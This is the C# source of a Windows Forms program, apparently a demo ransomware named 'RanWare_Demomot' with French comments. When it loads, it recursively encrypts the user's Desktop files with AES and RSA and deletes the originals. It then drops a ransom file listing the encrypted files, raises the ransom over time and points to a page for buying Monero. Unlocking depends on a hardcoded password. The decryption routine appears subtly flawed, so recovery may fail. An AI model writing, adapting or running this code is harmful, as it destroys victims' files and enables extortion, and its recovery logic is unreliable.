using System.IO;
using System.Text;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Media;

namespace RanWare_Demomot
{
    public partial class Form1 : Form
    {
        // Declare CspParmeters and RsaCryptoServiceProvider
        // objects with global scope of Form class.
        //Permet d'utiliser le service rsa
        readonly CspParameters cspP = new CspParameters();
        RSACryptoServiceProvider rsa;

        bool isDecripted;//Bool pour savoir si l'utilsiateur a decrypter ses fichiers
        List<string> filesName = new List<string>();//Liste qui va contenir les nom des fichiers
        int numberOfFiles;//Variables pour compter le nombre de fichiers encrypt?s
        int elapsedSeconds = 0;//Compte le nombre de seconde pour les affichers
        int numberOfSeconds = 0;//Compteur qui ? toujours la m?me valeur que elapsedSecond mais qui va jusqu'au nimbre de seconde souhait? puis est remis ? z?ro
        double amount = 1.5;//Montant de la ran?on


        Random randomPos = new Random();//Position random du bouton "Stop the muisc"
        SoundPlayer nyanPlayer = new SoundPlayer(@"Sound/Nyan.wav");//Son nyan
        SoundPlayer poneyPlayer = new SoundPlayer(@"Sound/poney.wav");//Son poney
        const bool ENCRYPT_DESKTOP = true;//Encrypte le bureau
        const bool DECRYPT_DESKTOP = true;//Decrypte le bureau
        const bool ENCRYPT_DOCUMENTS = false;//Encrypte les documents
        const bool DECRYPT_DOCUMENTS = false;//Derypte les documents
        const bool ENCRYPT_PICTURES = false;//Encrypte les images
        const bool DECRYPT_PICTURES = false;//Decrypte les images
        const string KEYNAME = "Password1";//Clef
        const string ENCRYPTED_FILE_EXTENSION = ".titi";//Extention des fichiers encrypt?s

        string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);//Repertoire du bureau
        string Documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);//Repertoire documents
        string Pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);//Repertoire photos

        

        public Form1()
        {
            InitializeComponent();
            nyanPlayer.PlayLooping();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.ShowInTaskbar = false;//Pas d'?cone dans la barre des t?ches

            if (ENCRYPT_DESKTOP)
            {
                encryptFolderFiles(Desktop);//Encrypte le bureau
            }

            if (ENCRYPT_PICTURES)
            {
                encryptFolderFiles(Pictures);//Encrypte les photos
            }

            if (ENCRYPT_DOCUMENTS)
            {
                encryptFolderFiles(Documents);//Encrypte les documents
            }

            lblNbr.Text = Convert.ToString(numberOfFiles);//Affiche le nombre de fichiers encrypt?s

            if (numberOfFiles > 0)
            {
                ransomLetter(filesName);//Cr?e un fichier texte affichant tous les fichiers encrypt?s
            }
        }

        /// <summary>
        /// Envoi chaque fichier du repertoire ? la m?thode qui les encryptes
        /// </summary>
        /// <param name="sDir"></param>
        private void encryptFolderFiles(string sDir)
        {
            // Stores a key pair in the key container.
            cspP.KeyContainerName = KEYNAME;
            rsa = new RSACryptoServiceProvider(cspP)
            {
                PersistKeyInCsp = true
            };

            //Envois ? la m?thode EncryptFile les fichiers trouv?
            foreach (string files in Directory.GetFiles(sDir))
            {
                if (!files.Contains(ENCRYPTED_FILE_EXTENSION))
                {
                    EncryptFile(new FileInfo (files));
                }
            }

            //Si un dossier est trouv?, retourne ? la m?thode encryptFolderFiles pour encrypter les fichiers du dossier
            foreach (string directory in Directory.GetDirectories(sDir))
            {
                encryptFolderFiles(directory);
            }
        }

        /// <summary>
        /// Encrypte le fichier (AES)
        /// </summary>
        /// <param name="inputFile"></param>Fichier ? encrypter
        private void EncryptFile(FileInfo inputFile)
        {
            if (inputFile.Extension != ".ini" && inputFile.Name != "RECOVER_FILES.txt")//?vite les fichier .ini et le fichier texte affichant tous les fichiers encrypter
            {
                //Cr?e une instance de la classe Aes pour l'encryptage symetrique(une seule clef)
                Aes aes = Aes.Create();
                ICryptoTransform transform = aes.CreateEncryptor();

                //Encrypt la clef Aes avec le service RSA
                //rsa doit ?tre instenti? pr?cedement
                byte[] keyEncrypted = rsa.Encrypt(aes.Key, false);

                // Create byte arrays to contain
                // the length values of the key and IV.
                int lKey = keyEncrypted.Length;
                byte[] LenK = BitConverter.GetBytes(lKey);
                int lIV = aes.IV.Length;
                byte[] LenIV = BitConverter.GetBytes(lIV);

                // Cr?e le nouveau fichier encrypter
                string testPath = Path.GetFullPath(inputFile.FullName);
                string outFile = Path.Combine(testPath);

                //Va ecrire dans le nouveau fichier le message encrypter
                using (var outFs = new FileStream(outFile + ENCRYPTED_FILE_EXTENSION, FileMode.Create))//Cr?e le nouveau fichier (nom du fichier + ancienne extention.nouvell extention)
                {
                    outFs.Write(LenK, 0, 4);
                    outFs.Write(LenIV, 0, 4);
                    outFs.Write(keyEncrypted, 0, lKey);
                    outFs.Write(aes.IV, 0, lIV);

                    // Ecrit le texte encrypt? utilise CryptoStream
                    using (var outStreamEncrypted =
                        new CryptoStream(outFs, transform, CryptoStreamMode.Write))
                    {
                        int count = 0;
                        int offset = 0;

                        // blockSizeBytes can be any arbitrary size.
                        int blockSizeBytes = aes.BlockSize / 8;
                        byte[] data = new byte[blockSizeBytes];
                        int bytesRead = 0;

                        using (var inFs = new FileStream(inputFile.FullName, FileMode.Open))
                        {
                            do
                            {
                                count = inFs.Read(data, 0, blockSizeBytes);
                                offset += count;
                                outStreamEncrypted.Write(data, 0, count);
                                bytesRead += blockSizeBytes;
                            } while (count > 0);
                        }
                        outStreamEncrypted.FlushFinalBlock();
                    }
                }
                filesName.Add(inputFile.FullName);//Ajoute le fichier encrypt? ? la liste
                numberOfFiles++;//Incr?mente le nombre de fichiers
                File.Delete(inputFile.FullName);//Supprime le fichier originel
            }
        }

        /// <summary>
        /// Envoi chaque fichier du repertoire ? la m?thode qui les decryptes (m?me principe que pour l'encryptage)
        /// </summary>
        /// <param name="sDir"></param>R?pertoire ou l'on veut chercher les fichiers ? dercrypter
        private void decryptFolderFiles(string sDir)
        {
            foreach (string f in Directory.GetFiles(sDir))
            {
                if (f.Contains(ENCRYPTED_FILE_EXTENSION))
                {
                    DecryptFile(new FileInfo(f));
                }
            }

            foreach (string d in Directory.GetDirectories(sDir))
            {
                decryptFolderFiles(d);
            }
        }
        /// <summary>
        /// Quand l'utilisateur clique sur le bouton decrypt, si le mot de passe est le bon, va appeler la methode qui va chercher tous le fichiers d'un r?pertoire et les envoyer ? la methode qui les encrypte
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnDecrypt_Click(object sender, EventArgs e)
        {
            if (txtBoxInput.Text == "SqBmxsihdA6heaVOI3VG")
            {
                if (DECRYPT_DESKTOP)
                {
                    decryptFolderFiles(Desktop);
                }

                if (DECRYPT_PICTURES)
                {
                    decryptFolderFiles(Pictures);
                }
                if (DECRYPT_DOCUMENTS)
                {
                    decryptFolderFiles(Documents);
                }
                isDecripted = true;
                ransomLetter(filesName);
                MessageBox.Show("Merci d'avoir fais affaire avec nous :)\n Nombre de fichiers decrypt?s : " + lblNbr.Text);
                nyanPlayer.Stop();
                poneyPlayer.Stop();
                Application.Exit();
            }
            else
            {
                MessageBox.Show("Bien essay?");
            }
        }

        /// <summary>
        /// Decrypt le fichier
        /// </summary>
        /// <param name="file"></param>Fichier ? decrypter
        private void DecryptFile(FileInfo file)
        {
            // Cr?e une instance Aes
            Aes aes = Aes.Create();

            // Create byte arrays to get the length of
            // the encrypted key and IV.
            // These values were stored as 4 bytes each
            // at the beginning of the encrypted package.
            byte[] LenK = new byte[4];
            byte[] LenIV = new byte[4];

            //Cr?e le fichier non encrypt?
            string outFile = Path.ChangeExtension(file.FullName.Replace(".titi", ".titi"), "");

            // Utilise FileStream pour lire le fichier encrypt?
            // file (inFs) and save the decrypted file (outFs).
            using (var inFs = new FileStream(file.FullName, FileMode.Open))
            {
                inFs.Seek(0, SeekOrigin.Begin);
                inFs.Read(LenK, 0, 3);
                inFs.Seek(4, SeekOrigin.Begin);
                inFs.Read(LenIV, 0, 3);

                // Convert the lengths to integer values.
                int lenK = BitConverter.ToInt32(LenK, 0);
                int lenIV = BitConverter.ToInt32(LenIV, 0);

                // Determine the start postition of
                // the ciphter text (startC)
                // and its length(lenC).
                int startC = lenK + lenIV + 8;
                int lenC = (int)inFs.Length - startC;

                // Create the byte arrays for
                // the encrypted Aes key,
                // the IV, and the cipher text.
                byte[] KeyEncrypted = new byte[lenK];
                byte[] IV = new byte[lenIV];

                // Extract the key and IV
                // starting from index 8
                // after the length values.
                inFs.Seek(8, SeekOrigin.Begin);
                inFs.Read(KeyEncrypted, 0, lenK);
                inFs.Seek(8 + lenK, SeekOrigin.Begin);
                inFs.Read(IV, 0, lenIV);

                //  Directory.CreateDirectory(DecrFolder);
                // Use RSACryptoServiceProvider
                // to decrypt the AES key.
                byte[] KeyDecrypted = rsa.Decrypt(KeyEncrypted, false);

                //Decrypte la clef
                ICryptoTransform transform = aes.CreateDecryptor(KeyDecrypted, IV);

                using (var outFs = new FileStream(outFile, FileMode.Create))
                {
                    int count = 0;
                    int offset = 0;

                    // blockSizeBytes can be any arbitrary size.
                    int blockSizeBytes = aes.BlockSize / 8;
                    byte[] data = new byte[blockSizeBytes];


                    // Start at the beginning
                    // of the cipher text.
                    inFs.Seek(startC, SeekOrigin.Begin);
                    using (var outStreamDecrypted =
                        new CryptoStream(outFs, transform, CryptoStreamMode.Write))
                    {
                        do
                        {
                            count = inFs.Read(data, 0, blockSizeBytes);
                            offset += count;
                            outStreamDecrypted.Write(data, 0, count);
                        } while (count > 0);
                        outStreamDecrypted.FlushFinalBlock();
                    }
                }
            }
            File.Delete(file.FullName);//Efface le fichier encrypt?
        }

        /// <summary>
        /// Cr?e un fichier de "ran?on" regroupant tous les nom des fichiers encrypt?
        /// </summary>
        /// <param name="files"></param>
        private void ransomLetter(List<string> files)
        {
            string path = Desktop + @"\RECOVER_FILES.txt";
            FileInfo fi = new FileInfo(path);
            if (fi.Exists)
            {
                fi.Delete();
            }

            using (FileStream fs = fi.Create())
            {
                foreach (string fileName in files)
                {
                    Byte[] info = new UTF8Encoding(true).GetBytes(fileName + "\n");
                    fs.Write(info, 0, info.Length);
                }
            }
            //Delete le fichier de ran?on si l'utilisateur a decrypt? ses fichiers
            if (isDecripted == true)
            {
                fi.Delete();
            }
        }

        /// <summary>
        /// Quand l'utilisateur clique sur le lien
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            try
            {
                VisitLink();
            }
            catch (Exception)
            {
                MessageBox.Show("Impossible d'ouvrir le lien");
            }
        }
        /// <summary>
        /// Methode qui ouvre le lien
        /// </summary>
        private void VisitLink()
        {
            linkLabel1.LinkVisited = true;
            Process.Start(new ProcessStartInfo("https://www.binance.com/en/buy-monero") { UseShellExecute = true});
        }

        /// <summary>
        /// Quand l'utilisateur passe la souris sur le boutton stop celui ci change de position
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnStop_MouseEnter(object sender, EventArgs e)
        {
            int posX = randomPos.Next(1000, 1150);
            int posY = randomPos.Next(400, 470);
            btnStop.Location = new Point(posX, posY);
        }

        /// <summary>
        /// Boutton pour stopper la premi?re music (lance la deuxi?me)
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnStop_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Ok vous n'aimez vraiment pas cette douce m?lodie");
            nyanPlayer.Stop();
            poneyPlayer.PlayLooping();
            btnStop.Enabled = false;
        }
        /// <summary>
        /// M?thode ? chaque seconde
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void timer_Tick(object sender, EventArgs e)
        {
            elapsedSeconds++;
            numberOfSeconds++;
            TimeSpan time = TimeSpan.FromSeconds(elapsedSeconds);
            lblTime.Text = time.ToString(@"hh\:mm\:ss");
            if (numberOfSeconds == 1800)
            {
                amount += 0.5;
                lblAmount.Text = Convert.ToString(amount);
                numberOfSeconds = 0;
            }
        }
    }
}